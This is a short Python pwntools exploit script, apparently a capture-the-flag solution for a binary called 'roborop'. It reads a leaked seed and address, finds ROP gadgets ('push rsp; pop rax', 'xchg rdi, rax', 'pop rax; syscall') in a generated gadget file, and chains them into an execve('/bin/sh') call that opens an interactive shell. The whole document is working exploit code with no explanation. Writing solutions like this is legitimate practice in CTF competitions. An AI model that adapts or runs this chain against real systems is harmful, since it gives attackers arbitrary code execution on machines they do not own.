from pwn import *

p = process('./roborop')
# p = remote('roborop-1.play.hfsc.tf', 1993)
context.binary = ELF('./roborop')

p.recvuntil(b'seed: ')
seed = int(p.recvline()[:-1], 16)
p.recvuntil(b'addr: ')
addr = int(p.recvline()[:-1], 16)
process(['./a.out', str(seed)]).poll(block=True)

f = open('./gadgets', 'rb')
gadgets = f.read()
try:
    push_rsp_pop_rax = gadgets.index(asm("push rsp; pop rax; ret")) + addr
    add_al = gadgets.index(asm("add al, 0x20; ret")) + addr
    xchg_rdi_rax = gadgets.index(asm("xchg rdi, rax; ret")) + addr
    pop_rax_syscall = gadgets.index(asm("pop rax; syscall")) + addr
except:
    print("Not Found")
    exit()
finally:
    f.close()

payload = flat([
    push_rsp_pop_rax,
    add_al,
    xchg_rdi_rax,
    pop_rax_syscall, 0x3b,
    b'/bin/sh\0'
])

p.sendline(payload)
p.interactive()
